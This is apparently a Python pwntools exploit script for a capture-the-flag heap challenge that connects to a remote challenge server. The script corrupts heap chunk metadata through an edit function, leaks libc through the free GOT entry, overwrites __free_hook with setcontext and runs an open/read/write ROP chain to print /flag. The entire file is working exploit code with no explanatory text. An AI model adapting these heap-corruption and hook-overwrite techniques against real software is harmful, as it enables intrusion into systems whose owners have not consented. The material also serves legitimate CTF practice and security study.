from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv
from subprocess import check_output

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

context.log_level = 'DEBUG'
binary = './pwn'
context.binary = binary
elf = ELF(binary,checksec=False)
libc_path = './libc.so.6'
#libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
#libc_path = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
#env={'LD_PRELOAD':libc_path}
libc = ELF(libc_path,checksec=False)
one = map(int, check_output(['one_gadget','--raw',libc_path]).split(' '))
p = remote('node3.buuoj.cn',28195) if argv[1]=='r' else process(binary)

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,2,4,3
def add(size,content='a'*8):
	sla('>>',_add)
	sla('_?',size)
	sa('no?',content)

def free(index):
	sla('>>',_free)
	sla('index ?',index)

def edit(index,content):
	sla('>>',_edit)
	sla('index ?',index)
	sa('content ?',content)

def show(index):
	sla('>>',_show)
	sla('index ?',index)

# start
buf = 0x6032e0
size = 0x603260
sla('name?','merc')

payload = flat('a'*0x1f0,0,0x81)
add(0x70,payload)
add(0x70,payload)
add(0x70,payload)
free(1)
edit(0,flat('a'*0x70,0,0x81,size-0x10))

add(0x70,payload) # 1
add(0x70,payload) # 3
edit(3,p64(0x0000020000000200)*16+p64(elf.got['free']))
show(0)
ru('\n')
free_ = uu64(r(6))
base,libc,system = leak_libc('free',free_,libc)
free_hook = base+libc.sym['__free_hook']
setcontext = base+libc.sym['setcontext']

add(0x20,payload) # 4
add(0x20,payload) # 5
add(0x20,payload) # 6
add(0x40,payload) # 7
free(4)
free(5)
edit(3,p64(0x0000020000000200)*16+flat(free_hook,0,0,0,0,0)+'\xc0')

show(6)
ru('\n')
heap = uu64(ru('\n'))-0x180
leak('heap',heap)
edit(0,p64(setcontext+53))

pop_rdi = base+0x21102
pop2 = base+0x1150c9
open = base+libc.sym['open']
read = base+libc.sym['read']
write = base+libc.sym['write']
bss = elf.bss()

payload = p64(0)*5+p64(0xffffffff)+p64(0)+p64(0)*13+p64(heap+0x2c0)
layout = [
	pop_rdi,0,pop2,8,bss,read,
	pop_rdi,bss,pop2,0,0,open,
	pop_rdi,3,pop2,0x30,bss,read,
	pop_rdi,1,pop2,0x30,bss,write
]
payload += flat(layout)
edit(7,payload)
free(7)
sl('/flag\x00')
# end

p.interactive()